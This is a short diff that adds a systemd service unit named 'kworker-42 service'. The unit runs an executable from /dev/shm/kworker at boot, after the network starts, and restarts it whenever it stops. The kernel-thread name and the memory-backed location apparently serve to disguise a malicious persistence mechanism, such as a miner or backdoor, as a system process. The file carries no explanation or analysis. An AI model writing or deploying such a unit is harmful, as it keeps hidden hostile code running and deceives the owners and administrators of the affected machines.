@@ -1,0 +1,11 @@
+[Unit]
+Description=kworker-42 service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/dev/shm/kworker
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
